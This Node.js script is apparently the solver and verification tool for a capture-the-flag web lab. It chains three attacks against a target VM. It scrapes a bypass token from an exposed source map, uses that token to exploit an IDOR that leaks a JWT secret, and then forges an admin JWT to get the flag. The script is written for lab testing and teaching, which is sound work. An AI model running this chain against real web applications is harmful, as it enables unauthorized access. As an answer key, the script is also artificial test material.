#!/usr/bin/env node
/**
 * SoundWave Lab Solver & Verification Script
 * Used to test all 3 phases of the exploit chain against a live target VM.
 * No external npm packages required (pure Node.js standard library).
 */

const http = require('http');
const crypto = require('crypto');

const targetIp = process.argv[2];

if (!targetIp) {
  console.log('\x1b[31m[-] Error: Missing Target VM IP Address.\x1b[0m');
  console.log('Usage: node verify.js <VM_IP>');
  process.exit(1);
}

const targetUrl = targetIp.startsWith('http') ? targetIp : `http://${targetIp}`;
console.log(`\n\x1b[35m=== Target: ${targetUrl} ===\x1b[0m\n`);

// Helper to handle http requests
function request(url, options = {}) {
  return new Promise((resolve, reject) => {
    const parsedUrl = new URL(url);
    const reqOptions = {
      hostname: parsedUrl.hostname,
      port: parsedUrl.port || 80,
      path: parsedUrl.pathname + parsedUrl.search,
      method: options.method || 'GET',
      headers: options.headers || {}
    };

    const req = http.request(reqOptions, (res) => {
      let data = '';
      res.on('data', (chunk) => { data += chunk; });
      res.on('end', () => {
        resolve({
          status: res.statusCode,
          headers: res.headers,
          body: data
        });
      });
    });

    req.on('error', (err) => reject(err));
    
    if (options.body) {
      req.write(typeof options.body === 'string' ? options.body : JSON.stringify(options.body));
    }
    req.end();
  });
}

// Helpers for JWT signing
function base64url(buf) {
  return buf.toString('base64')
    .replace(/=/g, '')
    .replace(/\+/g, '-')
    .replace(/\//g, '_');
}

function forgeJwt(payload, secret) {
  const header = { alg: 'HS256', typ: 'JWT' };
  const encodedHeader = base64url(Buffer.from(JSON.stringify(header)));
  const encodedPayload = base64url(Buffer.from(JSON.stringify(payload)));
  const input = `${encodedHeader}.${encodedPayload}`;
  const signature = crypto.createHmac('sha256', secret).update(input).digest();
  return `${input}.${base64url(signature)}`;
}

async function run() {
  try {
    // ==========================================
    // PHASE 1: Webpack Source Map Recon
    // ==========================================
    console.log('\x1b[33m[*] Starting Phase 1: Source Map Recon...\x1b[0m');
    const mainPage = await request(targetUrl);
    
    // Find index script chunk
    const scriptRegex = /_next\/static\/chunks\/pages\/index-[a-f0-9]+\.js/;
    const scriptMatch = mainPage.body.match(scriptRegex);
    
    if (!scriptMatch) {
      throw new Error('Could not parse Next.js index page script chunk from HTML.');
    }
    
    const sourceMapUrl = `${targetUrl}/${scriptMatch[0]}.map`;
    console.log(`[+] Located index bundle: ${scriptMatch[0]}`);
    console.log(`[+] Fetching source map: ${sourceMapUrl}`);
    
    const sourceMapRes = await request(sourceMapUrl);
    if (sourceMapRes.status !== 200) {
      throw new Error(`Source map endpoint returned HTTP ${sourceMapRes.status}`);
    }
    
    // Scan for bypass token
    const bypassTokenRegex = /SOUNDWAVE_DEV_BYPASS_TOKEN\s*=\s*"([^"]+)"/;
    const tokenMatch = sourceMapRes.body.match(bypassTokenRegex);
    
    if (!tokenMatch) {
      throw new Error('Webpack source map fetched, but staging token is missing in bundle mappings.');
    }
    
    const bypassToken = tokenMatch[1];
    console.log(`\x1b[32m[+] Phase 1 SUCCESS: Found staging bypass token: "${bypassToken}"\x1b[0m\n`);

    // ==========================================
    // PHASE 2: IDOR on Media Metadata API
    // ==========================================
    console.log('\x1b[33m[*] Starting Phase 2: IDOR exploitation...\x1b[0m');
    
    // Try unauthorized IDOR
    const idorPrivateUrl = `${targetUrl}/api/v1/episodes/view?id=100`;
    console.log(`[+] Attempting unauthorized request to private episode ID 100...`);
    const idorUnauthorized = await request(idorPrivateUrl);
    
    if (idorUnauthorized.status !== 403) {
      throw new Error(`IDOR check failed: Expected HTTP 403 on private endpoint, got HTTP ${idorUnauthorized.status}`);
    }
    console.log('[+] Target correctly returned HTTP 403 Forbidden.');
    
    // Replay with bypass token
    console.log(`[+] Replaying request with X-Bypass-Token header...`);
    const idorBypassed = await request(idorPrivateUrl, {
      headers: { 'X-Bypass-Token': bypassToken }
    });
    
    if (idorBypassed.status !== 200) {
      throw new Error(`Bypass header check failed: Expected HTTP 200, got HTTP ${idorBypassed.status}`);
    }
    
    const episodeData = JSON.parse(idorBypassed.body);
    const secretRegex = /JWT_SECRET=([a-zA-Z0-9_]+)/;
    const secretMatch = episodeData.description.match(secretRegex);
    
    if (!secretMatch) {
      throw new Error('Private metadata returned, but JWT_SECRET was not found in description.');
    }
    
    const jwtSecret = secretMatch[1];
    console.log(`\x1b[32m[+] Phase 2 SUCCESS: Leaked JWT_SECRET: "${jwtSecret}"\x1b[0m\n`);

    // ==========================================
    // PHASE 3: JWT Forgery & Flag Acquisition
    // ==========================================
    console.log('\x1b[33m[*] Starting Phase 3: JWT forgery...\x1b[0m');
    
    const payload = {
      username: 'admin',
      role: 'editor'
    };
    
    const forgedToken = forgeJwt(payload, jwtSecret);
    console.log(`[+] Forged admin session token: ${forgedToken.substring(0, 30)}...`);
    
    console.log(`[+] Sending forged token to backend verification API...`);
    const verifyRes = await request(`${targetUrl}/api/v1/admin/verify`, {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
        'Authorization': `Bearer ${forgedToken}`
      },
      body: { token: forgedToken }
    });
    
    if (verifyRes.status !== 200) {
      throw new Error(`Admin verify returned HTTP ${verifyRes.status}: ${verifyRes.body}`);
    }
    
    const authData = JSON.parse(verifyRes.body);
    if (authData.status !== 'success' || !authData.flag) {
      throw new Error('JWT accepted but server did not return flag.');
    }
    
    console.log(`\x1b[32m[+] Phase 3 SUCCESS: Successfully authenticated as ${authData.user} (${authData.role})\x1b[0m`);
    console.log(`\n\x1b[36m====================================================\x1b[0m`);
    console.log(`\x1b[1;36m FLAG CAPTURED: ${authData.flag}\x1b[0m`);
    console.log(`\x1b[36m====================================================\x1b[0m\n`);

  } catch (err) {
    console.log(`\n\x1b[31m[-] Verification failed: ${err.message}\x1b[0m\n`);
    process.exit(1);
  }
}

run();
